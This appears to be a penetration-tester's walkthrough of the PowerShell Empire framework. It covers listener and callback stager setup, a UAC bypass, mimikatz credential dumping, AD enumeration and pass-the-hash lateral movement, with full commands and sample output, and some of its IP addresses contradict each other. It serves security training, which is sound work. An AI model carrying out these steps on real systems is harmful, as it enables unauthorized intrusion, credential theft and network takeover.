# PowerShell Empire

A post-exploitation framework which is useful once foothold is obtained.

* Tool: https://github.com/BC-SECURITY/Empire
* HowTo: https://hackmag.com/security/powershell-empire/

### Stating up PSempire

* Setup a server

`sudo powershell-empire server`

Server manages all requests and can be understood as a multi-player game server

Server address once started can be like `[*] Starting Empire RESTful API on 0.0.0.0:1337`

* Setup a client

Via client attacker uses server to attack victims. Connect to server address show like one above:

```bash

sudo powershell-empire client

#in the psempire shell connect to local host or other ip

(Empire) > connect -c localhost

[*] Connected to localhost

```

### Connecting to Victim

* To connect to victim it is necessary to setup a `listener` and a `stager`
* listener is going to wait on you attacker host for the stager, which is on victim host, to connect

#### Setup a Listener

```bash
#lsit listeners
(Empire) > listeners

#none right now
┌Listeners List──────┬───────────────────┬────────────┬─────────┐
│ ID │ Name │ Module │ Listener Category │ Created At │ Enabled │
└────┴──────┴────────┴───────────────────┴────────────┴─────────┘

#available listeners
(Empire: listeners) > uselistener

#press TAB after uselistener and get a list of possible listeners
(Empire: listeners) > uselistener
                                   dbx             
                                   http            
                                   http_com        
                                   http_foreign    
                                   http_hop        
                                   http_malleable  
                                   onedrive        
                                   redirector      

#http listener is always a good choice since not blocked mostly by FWs

(Empire: listeners) > uselistener http

 Author       @harmj0y                                                              
 Description  Starts a http[s] listener (PowerShell or Python) that uses a GET/POST                                                  
```

Now like with Metasploit set the attacker listener IP and port

```bash

(Empire: uselistener/http) > set Host 192.168.115.111
[*] Set Host to 192.168.119.158
(Empire: uselistener/http) > set Port 443
[*] Set Port to 443

#execute and enjoy

(Empire: uselistener/http) > execute
[+] Listener http successfully started

```

#### Setup a stager

Now somehow we need to connect to a victim. There are two ways of doing it:

1. bind: we connect to a victim
2. reverse: victim connects to us

Both of those ways need a stager that must be transferred to victim and activated preferrably with root or SYSTEM privileges.

```bash
#generate windows stager

(Empire: listeners) > usestager windows/launcher_bat

 Author       @harmj0y                                                            
 Description  Generates a self-deleting .bat launcher for Empire. Only works with 
              the HTTP and HTTP COM listeners.                                    
 Name         windows/launcher_bat  

#assign listener to stager

(Empire: usestager/windows/launcher_bat) > set Listener http
[*] Set Listener to http

# generate stager file 

(Empire: usestager/windows/launcher_bat) > execute
[+] stage1.bat written to /var/lib/powershell-empire/empire/client/generated-stagers/stage1.bat

#upload this stage file to victim host and launch it
#on success you see

[*] Sending agent (stage 2) to TV6GENUD at 192.168.158.10

# check if its really there 

(Empire: usestager/windows/launcher_bat) > agents

┌Agents──────────┬────────────┬───────────────┬─────────────┬
│ 1  │ TV6GENUD* │ powershell │ 172.16.158.10 │ corp\SYSTEM │ powershell │ 3708 │ 5/0.0 │ 2023-03-06 20:40:24 CET │ http     │

# looks good
# start using the connected agent

(Empire: agents) > interact TV6GENUD
(Empire: TV6GENUD) >

#see help for more interesting commands

(Empire: TV6GENUD) > help

# once task is started it may take some time until it runs due to delay

```

### Privesc

```bash

(Empire: TV6GENUD) > usemodule powershell/privesc/powerup/allchecks
[*] Set Agent to TV6GENU

```

* Bypassing UAC

`usemodule privesc/bypassuac_fodhelper`

### Stealing Credentials

```bash 

# what do we have?

usemodule credentials/

# lets have some quick win

usemodule credentials/mimikatz/logonpasswords

# mimikatz shell appears

mimikatz(powershell) # sekurlsa::logonpasswords

# or just simply

(Empire: TV6GENUD) > credentials


```

### Enumerating 

* `usemodule` command has various recon techniques

```powershell

# example for enumerating user

usemodule situational_awareness/network/powerview/get_user

```

### Lateral Movement

How to move around Active Directory

```bash

(Empire) > usemodule lateral_movement/invoke_smbexec

(Empire: powershell/lateral_movement/invoke_smbexec) > info

              Name: Invoke-SMBExec
            Module: powershell/lateral_movement/invoke_smbexec
        NeedsAdmin: False
         OpsecSafe: True
          Language: powershell
MinLanguageVersion: 2
        Background: False
   OutputExtension: None


(Empire: powershell/lateral_movement/invoke_smbexec) > set ComputerName DC1

(Empire: powershell/lateral_movement/invoke_smbexec) > set Listener http

(Empire: powershell/lateral_movement/invoke_smbexec) > set Username admin

(Empire: powershell/lateral_movement/invoke_smbexec) > set Hash a2c475c11da2a0748290d87aa966c327

(Empire: powershell/lateral_movement/invoke_smbexec) > set Domain example.com

(Empire: powershell/lateral_movement/invoke_smbexec) > execute


[*] Sending POWERSHELL stager (stage 1) to 10.xx.xx.xx
[*] New agent B18E4XVK checked in

# talk to new agent

interact B18E4XVK


```